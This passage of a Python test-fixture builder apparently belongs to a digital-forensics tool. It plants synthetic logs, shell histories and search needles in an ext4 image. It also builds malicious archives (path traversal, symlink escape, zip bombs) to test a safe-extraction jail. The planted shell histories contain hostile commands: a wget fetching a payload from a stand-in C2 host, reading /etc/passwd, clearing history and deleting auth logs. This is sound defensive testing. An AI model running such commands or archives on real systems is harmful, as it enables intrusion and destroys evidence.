_LOCALTIME_TARGET = f"/usr/share/zoneinfo/{LOG_SEARCH_TIMEZONE}"

# --- (1)+(2) the year the RFC3164 lines resolve to (D-46 year inference) -----
# The rotated auth set spans a Dec -> Jan boundary: the OLDEST member (auth.log.2.gz)
# carries December lines of YEAR-1, the newer members carry January lines of YEAR.
# Year inference seeds from file mtime/rotation order and must produce BOTH years,
# flagged. The newest (live) auth.log mtime fixes the seed year.
LOG_SEARCH_YEAR = 2026
LOG_SEARCH_PREV_YEAR = LOG_SEARCH_YEAR - 1  # the Dec lines belong here

# --- (5) planted search payloads (SEARCH-01/02) ------------------------------
# An ALLOCATED file whose content contains a known literal the content scanner
# must find by file + offset.
LOG_SEARCH_ALLOCATED_NAME = "evidence_note.txt"
LOG_SEARCH_ALLOCATED_NEEDLE = b"ALLOCATED-NEEDLE-7f3a2b"
LOG_SEARCH_ALLOCATED_CONTENT = (
    b"investigator note: nothing to see in this prefix padding region\n"
    + LOG_SEARCH_ALLOCATED_NEEDLE
    + b"\nand a trailing line after the planted needle\n"
)

# A DISTINCT known literal planted in UNALLOCATED space: written to a file which
# is then deleted (debugfs rm) so its data blocks survive, carrying the needle in
# unallocated space (mirrors the ext4_orphan technique). The unallocated scanner
# must find it by block + absolute offset.
LOG_SEARCH_UNALLOC_FILE = "to_be_deleted.bin"
LOG_SEARCH_UNALLOC_NEEDLE = b"UNALLOCATED-NEEDLE-9c5d1e"
# Pad to comfortably fill at least one 1 KiB block so the needle lands in a data
# block (not inline), and so the block survives the unlink with content intact.
LOG_SEARCH_UNALLOC_CONTENT = (
    b"deleted payload header padding " * 8
    + LOG_SEARCH_UNALLOC_NEEDLE
    + b" deleted payload trailer padding" * 8
)

# A known IOC term that appears in BOTH a log line and allocated content, so the
# IOC arm (SEARCH-02) reports it by file + offset. Chosen to look like an
# indicator (a domain) without being a real one.
LOG_SEARCH_IOC_TERM = b"evil-c2.example.invalid"

# A file whose hashes are a known-BAD-hash target (SEARCH-02). Its content is a
# fixed byte string so the hashes are byte-deterministic and independent of the
# disk image; the search hash arm reuses the Phase-4 filter/hashsets matcher.
LOG_SEARCH_BADHASH_NAME = "malware_sample.bin"
LOG_SEARCH_BADHASH_CONTENT = b"a planted known-bad file for the SEARCH-02 hash arm\n"
LOG_SEARCH_BADHASH_MD5 = hashlib.md5(LOG_SEARCH_BADHASH_CONTENT).hexdigest()
LOG_SEARCH_BADHASH_SHA1 = hashlib.sha1(LOG_SEARCH_BADHASH_CONTENT).hexdigest()
LOG_SEARCH_BADHASH_SHA256 = hashlib.sha256(LOG_SEARCH_BADHASH_CONTENT).hexdigest()

# --- (6) CR-01 tied-second count ---------------------------------------------
# Two syslog lines stamped at the IDENTICAL second with NULL fs meta. The
# super-timeline must order them byte-stably across two runs (CR-01 / Pitfall 3).
LOG_SEARCH_TIED_SECOND = "Jan 15 03:14:15"  # RFC3164 wall-clock, host-local
LOG_SEARCH_TIED_EVENT_COUNT = 2

# --- shell-history ground truth (LOG-03) -------------------------------------
LOG_SEARCH_HISTORY_USER = "alice"
LOG_SEARCH_BASH_EPOCH = 1736899200  # a `#<epoch>` HISTTIMEFORMAT pair in bash
LOG_SEARCH_ZSH_EPOCH = 1736899300  # a `: <ts>:<dur>;cmd` extended-history line


def _rfc3164(month_day_time: str, host: str, program: str, pid: int | None, msg: str) -> str:
    """Compose one RFC3164 syslog line: ``Mmm dd HH:MM:SS host prog[pid]: msg``."""
    tag = f"{program}[{pid}]" if pid is not None else program
    return f"{month_day_time} {host} {tag}: {msg}\n"


# Oldest rotated member (auth.log.2.gz): DECEMBER lines of the PREVIOUS year.
_AUTH_LOG_2 = "".join(
    [
        _rfc3164("Dec 30 23:58:01", "host01", "sshd", 4011,
                 "Failed password for invalid user oldguest from 198.51.100.7 port 2222 ssh2"),
        _rfc3164("Dec 31 23:59:59", "host01", "sshd", 4012,
                 "Accepted publickey for alice from 192.0.2.5 port 51000 ssh2"),
    ]
)
# Middle rotated member (auth.log.1): early-JANUARY lines of the seed year.
_AUTH_LOG_1 = "".join(
    [
        _rfc3164("Jan 02 08:00:00", "host01", "sshd", 5001,
                 "Accepted password for alice from 192.0.2.5 port 51002 ssh2"),
        _rfc3164("Jan 02 08:05:10", "host01", "sudo", None,
                 "alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update"),
        _rfc3164("Jan 02 08:06:00", "host01", "sshd", 5002,
                 "session opened for user alice by (uid=0)"),
    ]
)
# Live auth.log: later-JANUARY lines incl. a sudo authentication FAILURE + a
# session close + a line carrying the IOC term.
_AUTH_LOG_LIVE = "".join(
    [
        _rfc3164("Jan 15 02:00:00", "host01", "sudo", None,
                 "pam_unix(sudo:auth): authentication failure; logname=alice uid=1000 "
                 "euid=0 tty=/dev/pts/1 ruser=alice rhost= user=alice"),
        _rfc3164("Jan 15 02:01:30", "host01", "sshd", 6001,
                 "Failed password for alice from 203.0.113.9 port 40000 ssh2"),
        _rfc3164("Jan 15 02:02:45", "host01", "sshd", 6002,
                 f"Accepted publickey for alice from {LOG_SEARCH_IOC_TERM.decode()} port 40002 ssh2"),
        _rfc3164("Jan 15 02:05:00", "host01", "sshd", 6001,
                 "session closed for user alice"),
    ]
)
# syslog: service/kernel/cron/error lines (LOG-02) + the two CR-01 TIED-second
# lines (identical timestamp, distinct programs) for the tied-order regression.
_SYSLOG = "".join(
    [
        _rfc3164("Jan 15 01:00:00", "host01", "systemd", 1,
                 "Started Daily apt download activities."),
        _rfc3164("Jan 15 01:00:05", "host01", "kernel", None,
                 "[12345.6789] usb 1-1: new high-speed USB device number 5 using xhci_hcd"),
        _rfc3164("Jan 15 01:30:00", "host01", "CRON", 7001,
                 "(root) CMD (/usr/bin/backup.sh)"),
        _rfc3164("Jan 15 02:10:00", "host01", "nginx", 8001,
                 "error: upstream timed out connecting to evil-c2.example.invalid"),
        # --- two TIED-second events (CR-01 / Pitfall 3) ---
        _rfc3164(LOG_SEARCH_TIED_SECOND, "host01", "alpha", 9001, "tied event one"),
        _rfc3164(LOG_SEARCH_TIED_SECOND, "host01", "bravo", 9002, "tied event two"),
    ]
)
# bash history: bare commands AND one `#<epoch>` HISTTIMEFORMAT pair (LOG-03).
_BASH_HISTORY = (
    "ls -la\n"
    "cat /etc/passwd\n"
    f"#{LOG_SEARCH_BASH_EPOCH}\n"
    "wget http://evil-c2.example.invalid/payload.sh\n"
    "history -c\n"  # the tamperability tell — history was cleared
)
# zsh extended history: `: <start>:<elapsed>;<command>` lines (LOG-03).
_ZSH_HISTORY = (
    f": {LOG_SEARCH_ZSH_EPOCH}:0;whoami\n"
    f": {LOG_SEARCH_ZSH_EPOCH + 5}:2;sudo rm -rf /var/log/auth.log\n"
)
LOG_SEARCH_ETC_TIMEZONE_CONTENT = (LOG_SEARCH_TIMEZONE + "\n").encode()


def _groundtruth_dict() -> dict[str, object]:
    """Return the committed ground-truth sidecar payload (importable + on disk)."""
    return {
        "image": LOG_SEARCH_NAME,
        "timezone": LOG_SEARCH_TIMEZONE,
        "localtime_target": _LOCALTIME_TARGET,
        "year": LOG_SEARCH_YEAR,
        "prev_year": LOG_SEARCH_PREV_YEAR,
        "auth_log_members_oldest_to_newest": [
            "/var/log/auth.log.2.gz",
            "/var/log/auth.log.1",
            "/var/log/auth.log",
        ],
        "syslog_path": "/var/log/syslog",
        "bash_history_path": f"/home/{LOG_SEARCH_HISTORY_USER}/.bash_history",
        "zsh_history_path": f"/home/{LOG_SEARCH_HISTORY_USER}/.zsh_history",
        "bash_epoch": LOG_SEARCH_BASH_EPOCH,
        "zsh_epoch": LOG_SEARCH_ZSH_EPOCH,
        "allocated_search": {
            "path": f"/{LOG_SEARCH_ALLOCATED_NAME}",
            "needle": LOG_SEARCH_ALLOCATED_NEEDLE.decode(),
            "needle_offset": LOG_SEARCH_ALLOCATED_CONTENT.index(LOG_SEARCH_ALLOCATED_NEEDLE),
        },
        "unallocated_search": {
            "needle": LOG_SEARCH_UNALLOC_NEEDLE.decode(),
            "needle_offset_in_payload": LOG_SEARCH_UNALLOC_CONTENT.index(
                LOG_SEARCH_UNALLOC_NEEDLE
            ),
        },
        "ioc_term": LOG_SEARCH_IOC_TERM.decode(),
        "known_bad_hash": {
            "path": f"/{LOG_SEARCH_BADHASH_NAME}",
            "md5": LOG_SEARCH_BADHASH_MD5,
            "sha1": LOG_SEARCH_BADHASH_SHA1,
            "sha256": LOG_SEARCH_BADHASH_SHA256,
        },
        "tied_event_count": LOG_SEARCH_TIED_EVENT_COUNT,
        "tied_second": LOG_SEARCH_TIED_SECOND,
    }


def build_log_search_image(dest: Path) -> Path:
    """Build the committed Phase-5 log/search ext4 fixture (host-only, deterministic).

    Reuses the pinned-UUID + frozen-clock ext4 idiom (:func:`_mke2fs_ext4` +
    :func:`_run_debugfs`) so a rebuild is byte-identical. Plants the six corpora
    documented above via a single ``debugfs`` request script: directories,
    regular files (auth/syslog/history/search payloads), the gzip-compressed
    oldest auth member, the ``/etc/localtime`` symlink + ``/etc/timezone`` text,
    and a write-then-``rm`` file whose data blocks survive in UNALLOCATED space.

    The image is committed; CI never runs ``mkfs``/``debugfs`` (Phase-2/4
    discipline). All test-time access is read-only.
    """
    debugfs = _require_tool("debugfs")
    _truncate(dest, _LOG_SEARCH_SIZE)
    _mke2fs_ext4(dest)
    with tempfile.TemporaryDirectory() as td:
        tdp = Path(td)

        # Materialise each planted file on the host, gzip the oldest auth member.
        (tdp / "auth.log").write_bytes(_AUTH_LOG_LIVE.encode())
        (tdp / "auth.log.1").write_bytes(_AUTH_LOG_1.encode())
        # Deterministic gzip: fixed mtime=0 so the .gz bytes are reproducible.
        gz_path = tdp / "auth.log.2.gz"
        with gzip.GzipFile(
            filename="", mode="wb", fileobj=open(gz_path, "wb"), mtime=0
        ) as gz:
            gz.write(_AUTH_LOG_2.encode())
        (tdp / "syslog").write_bytes(_SYSLOG.encode())
        (tdp / "bash_history").write_bytes(_BASH_HISTORY.encode())
        (tdp / "zsh_history").write_bytes(_ZSH_HISTORY.encode())
        (tdp / "timezone").write_bytes(LOG_SEARCH_ETC_TIMEZONE_CONTENT)
        (tdp / "allocated.bin").write_bytes(LOG_SEARCH_ALLOCATED_CONTENT)
        (tdp / "badhash.bin").write_bytes(LOG_SEARCH_BADHASH_CONTENT)
        (tdp / "unalloc.bin").write_bytes(LOG_SEARCH_UNALLOC_CONTENT)

        u = LOG_SEARCH_HISTORY_USER
        script = (
            # directory tree
            "mkdir /var\n"
            "mkdir /var/log\n"
            "mkdir /home\n"
            f"mkdir /home/{u}\n"
            "mkdir /etc\n"
            # (1) rotated auth set
            f"write {tdp / 'auth.log'} /var/log/auth.log\n"
            f"write {tdp / 'auth.log.1'} /var/log/auth.log.1\n"
            f"write {gz_path} /var/log/auth.log.2.gz\n"
            # (2) syslog
            f"write {tdp / 'syslog'} /var/log/syslog\n"
            # (3) shell history
            f"write {tdp / 'bash_history'} /home/{u}/.bash_history\n"
            f"write {tdp / 'zsh_history'} /home/{u}/.zsh_history\n"
            # (4) /etc/localtime symlink + /etc/timezone text
            f"symlink /etc/localtime {_LOCALTIME_TARGET}\n"
            f"write {tdp / 'timezone'} /etc/timezone\n"
            # (5a) allocated search payload + known-bad-hash file
            f"write {tdp / 'allocated.bin'} /{LOG_SEARCH_ALLOCATED_NAME}\n"
            f"write {tdp / 'badhash.bin'} /{LOG_SEARCH_BADHASH_NAME}\n"
            # (5b) write-then-rm so blocks survive in UNALLOCATED space
            f"write {tdp / 'unalloc.bin'} /{LOG_SEARCH_UNALLOC_FILE}\n"
            f"rm /{LOG_SEARCH_UNALLOC_FILE}\n"
            "close\n"
        )
        _run_debugfs(debugfs, dest, script)

    # Write the committed ground-truth sidecar next to the image.
    sidecar = dest.parent / LOG_SEARCH_GROUNDTRUTH_NAME
    sidecar.write_text(
        json.dumps(_groundtruth_dict(), indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )
    return dest


# ---------------------------------------------------------------------------
# Malicious-archive builders (consumed by the safe_extract jail tests, plan 01-03)
# ---------------------------------------------------------------------------

# Caps so the builders themselves never become bombs (threat T-1-00-B).
_BOMB_FILLER_SIZE = 1 * 1024 * 1024  # 1 MiB of highly compressible zeros
_COUNT_BOMB_ENTRIES = 20_000


def build_zip_slip_tar(dest: Path) -> Path:
    """Build a tar whose member name escapes the destination (Zip Slip).

    The member name ``../../escape.txt`` must be REJECTED by the jail
    (``OutsideDestinationError`` under ``filter='data'``).
    """
    with tarfile.open(dest, "w") as tar:
        payload = b"escaped!\n"
        info = tarfile.TarInfo(name="../../escape.txt")
        info.size = len(payload)
        tar.addfile(info, io.BytesIO(payload))
    return dest


def build_symlink_escape_tar(dest: Path) -> Path:
    """Build a tar containing an absolute symlink escape (``link -> /etc/passwd``).

    Must be REJECTED by the jail (``AbsoluteLinkError`` / special-file refusal).
    """
    with tarfile.open(dest, "w") as tar:
        info = tarfile.TarInfo(name="link")
        info.type = tarfile.SYMTYPE
        info.linkname = "/etc/passwd"
        tar.addfile(info)
    return dest


def build_device_file_tar(dest: Path) -> Path:
    """Build a tar containing a character-device member.

    Must be REJECTED by the jail (``SpecialFileError`` under ``filter='data'``).
    """
    with tarfile.open(dest, "w") as tar:
        info = tarfile.TarInfo(name="dev/null")
        info.type = tarfile.CHRTYPE
        info.devmajor = 1
        info.devminor = 3
        tar.addfile(info)
    return dest


def build_ratio_bomb_zip(dest: Path) -> Path:
    """Build a zip with a tiny compressed / huge uncompressed ratio (size bomb).

    1 MiB of zeros compresses to a few hundred bytes — a high compression ratio
    the jail's ratio/size caps must REJECT. Capped at :data:`_BOMB_FILLER_SIZE`
    so the builder itself is bounded.
    """
    with zipfile.ZipFile(dest, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("bomb.bin", b"\x00" * _BOMB_FILLER_SIZE)
    return dest


def build_count_bomb_tar(dest: Path) -> Path:
    """Build a tar with a very large number of tiny members (count bomb).

    Exceeds a sane ``max_entries`` cap so the jail must REJECT on entry count.
    """
    with tarfile.open(dest, "w") as tar:
        empty = io.BytesIO(b"")
        for i in range(_COUNT_BOMB_ENTRIES):
            info = tarfile.TarInfo(name=f"f{i:06d}.txt")
            info.size = 0
            tar.addfile(info, empty)
    return dest


def main() -> None:
    """Regenerate every committed image next to this module (needs mkfs tools)."""
    here = Path(__file__).resolve().parent
    builders = (
        (TINY_RAW_NAME, build_tiny_raw_image),
        (TINY_EXT4_NAME, build_tiny_ext4_image),
        (TINY_NTFS_NAME, build_tiny_ntfs_image),
        (TINY_FAT32_NAME, build_tiny_fat32_image),
        (TINY_PARTITIONED_NAME, build_partitioned_image),
        # Phase 4 recovery fixtures.
        (EXT4_ORPHAN_NAME, build_ext4_orphan_image),
        (EXT4_OVERWRITTEN_NAME, build_ext4_overwritten_image),
        (NTFS_RESIDENT_NAME, build_ntfs_resident_deleted_image),
        # Phase 5 log/search fixture (also writes its ground-truth sidecar).
        (LOG_SEARCH_NAME, build_log_search_image),
    )
    for name, build in builders:
        out = build(here / name)
        print(f"wrote {out} ({os.path.getsize(out)} bytes)")
    # Phase 4 NSRL fixtures (stdlib sqlite3; two paths from one builder).
    minimal, metadata = build_nsrl_fixture(
        here / NSRL_MINIMAL_NAME, here / NSRL_METADATA_NAME
    )
    print(f"wrote {minimal} ({os.path.getsize(minimal)} bytes)")
    print(f"wrote {metadata} ({os.path.getsize(metadata)} bytes)")


if __name__ == "__main__":
    main()
